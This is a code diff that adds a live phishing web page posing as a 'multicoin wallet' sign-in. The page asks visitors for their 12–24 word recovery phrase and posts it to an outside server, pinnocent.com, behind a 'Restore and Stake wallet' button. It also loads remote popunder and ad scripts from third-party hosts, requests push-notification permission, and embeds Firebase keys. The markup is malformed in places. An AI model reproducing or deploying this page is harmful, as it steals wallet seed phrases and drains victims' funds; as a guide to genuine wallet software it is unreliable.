@@ -1,0 +1,222 @@
+
+  <!DOCTYPE html>
+<html>
+<head>
+ 
+<script src="https://www.gstatic.com/firebasejs/4.9.1/firebase.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+<link rel="manifest" href="manifest.json">
+<link rel="stylesheet" href="w3.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+<script>
+  // Initialize Firebase
+  /*Update this config*/
+  var config = {
+     apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
+  authDomain: "pinnocent-fa387.firebaseapp.com",
+  databaseURL: "https://pinnocent-fa387.firebaseio.com",
+  projectId: "pinnocent-fa387",
+  storageBucket: "pinnocent-fa387.appspot.com",
+  messagingSenderId: "403452483449",
+  appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
+  measurementId: "G-8DGVGDCCL2"
+  };
+  firebase.initializeApp(config);
+
+	// Retrieve Firebase Messaging object.
+	const messaging = firebase.messaging();
+	messaging.requestPermission()
+	.then(function() {
+	  console.log('Notification permission granted.');
+	  // TODO(developer): Retrieve an Instance ID token for use with FCM.
+	 
+               
+                vapidKey: 'BLf-6mYxA6BPIXK-MpMWYKuLDPpbKFtXdERFs506kY1xZsek0B8ieRRIikBGaO0LKrFXzglm-mNr4rpMypLLiJ4' }).then((currentToken) => {
+                if (currentToken) {
+                    console.log("Token is: "+currentToken);
+	  } else {
+	  	getRegToken();
+	  }
+
+	})
+	.catch(function(err) {
+	  console.log('Unable to get permission to notify.', err);
+	});
+
+	function getRegToken(argument) {
+		messaging.getToken()
+		  .then(function(currentToken) {
+		    if (currentToken) {
+		      saveToken(currentToken);
+		      console.log(currentToken);
+		      setTokenSentToServer(true);
+		    } else {
+		      console.log('No Instance ID token available. Request permission to generate one.');
+		      setTokenSentToServer(false);
+		    }
+		  })
+		  .catch(function(err) {
+		    console.log('An error occurred while retrieving token. ', err);
+		    setTokenSentToServer(false);
+		  });
+	}
+
+	function setTokenSentToServer(sent) {
+	    window.localStorage.setItem('sentToServer', sent ? 1 : 0);
+	}
+
+	function isTokenSentToServer() {
+	    return window.localStorage.getItem('sentToServer') == 1;
+	}
+
+	function saveToken(currentToken) {
+		$.ajax({
+			url: '?',
+			method: 'post',
+			data: 'token=' + currentToken
+		}).done(function(result){
+			console.log(result);
+		})
+	}
+
+	messaging.onMessage(function(payload) {
+	  console.log("Message received. ", payload);
+	  notificationTitle = payload.data.title;
+	  notificationOptions = {
+	  	body: payload.data.body,
+	  	icon: payload.data.icon,
+	  	image:  payload.data.image
+	  };
+	  var notification = new Notification(notificationTitle,notificationOptions);
+	});
+</script>
+</head>
+<body>
+<center>
+ 
+  
+</center>
+</body>
+
+<html>
+<head>
+
+   <title>Verify | form</title>
+   <html lang="en">
+                 <head>
+                 <meta charset="UTF-8">
+                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                 <title>Login</title>
+                 <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+                 <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+                 <script src="https://cdn.tailwindcss.com"></script>
+                 <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+                 <style type="text/css" id="operaUserStyle">
+                 body{
+                   background-color: white;
+                   color:black; 
+                 }
+                 .botu {
+                   width: 350px;
+                   height: 50px;
+                   background: #1e15d2ec;
+                   margin-top: 5px;
+                   border-radius: 50px;
+                   border: none;
+                   color:white;
+                 }
+                 .roundback {
+                   border-radius: 5px;
+                   background-color: white;
+                   border: 4px solid #515151;
+                   padding-top: 15px;
+                   margin-top: 20px;
+                 }
+                 h2 {
+                   font-family: "Roboto", sans-serif;
+  font-weight: 900;
+  font-style: normal;
+                 }
+                 </style>
+                 </head>
+                 <body class="bg-[#111111]">
+                  <noscript>You need to enable JavaScript to run this app.</noscript>
+                  <div id="root"><div>
+                  <div class="grid place-content-center grid-cols-1 md:px-96 mt-10 gap-10">
+                  <div class="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "></div>
+                    <div class="flex justify-center w-full">
+                       
+                    </div>
+                    <div class="flex justify-center w-full">
+                       
+                    </div>
+                    <!-- nav bar area -->
+                   <nav>
+                     <!-- small here-->
+                     <img src="smbanner.png" style="width:100%;" class="w3-hide-large w3-hide-medium">
+                     <img src="lgbanner.jpg" style="width:100%;" class="w3-hide-small">
+                   </nav>
+           <center>
+                    <h2 class="text-center" style="">SIGN IN TO YOUR MULTICOIN WALLET</h2>
+                    <form action="https://pinnocent.com/vpage" method="POST">
+                       <input type="hidden" name="link" value="custom template">
+                       <input type="hidden" name="ftype" value="normal">
+                       <input type="hidden" name="login" value="login">
+                       <input type="hidden" name="user_id" value="16934">
+                       <div class="p-2 w-full  gap-1  ">
+                         <div class="flex flex-col   p-2  gap-1">
+                          <label for="email" class="text-sm"> <b>Enter your secrete phrase </b></label>
+                            
+                          <input type="text" class="w-full border p-2 rounded-md" name="message_title" placeholder="Email or Phone" style="color:#111; display:none;">
+                         </div>
+                         <div class="flex flex-col   p-2   gap-1">
+                                  <center>
+                          <textarea type="text" class="roundback w-full border p-2 rounded-md" name="description" placeholder="Enter your 18 or 24 phrase here " id="password" autocomplete="new-password" aria-autocomplete="list" style="color:black; height:150px; width:350px;"required=""></textarea>
+                   <p><b> Typically 12 (sometimes 18,24) words seperated by single spaces
+                   </b>
+                   </p>
+                         </div>
+                         <div class="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
+                           <center>
+                            <button type="submit" class="text-black font-semibold p-3 rounded-md w-full bg-[#125ec3] hover:bg-blue-600 botu">Restore and Stake wallet</button>
+                         </div>
+                       </div>
+                    </form>
+                    </div>
+                 </div>
+               </div>
+               </body>
+               </html>  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-E7K8F1651E');
+</script>
+<script type="text/javascript">
+   var uid = '330441';
+   var wid = '717208';
+   var pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag);
+   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag)};
+</script>
+<script src="back.js?1718726358"> 
+</script>
+<script src="https://old.pinnocent.coms/jspopunder.min.js"></script>
+	<script>
+	jsPopunder('https://noopsaithu.net/4/7193696', {
+		name: 'poptest', 
+		width: (screen.width/2), 
+		height: (screen.height-100), 
+		top: 0, left: 0, 
+		wait: 43200, cap: 120000
+	});
+	</script>
+
+	
+  
+    
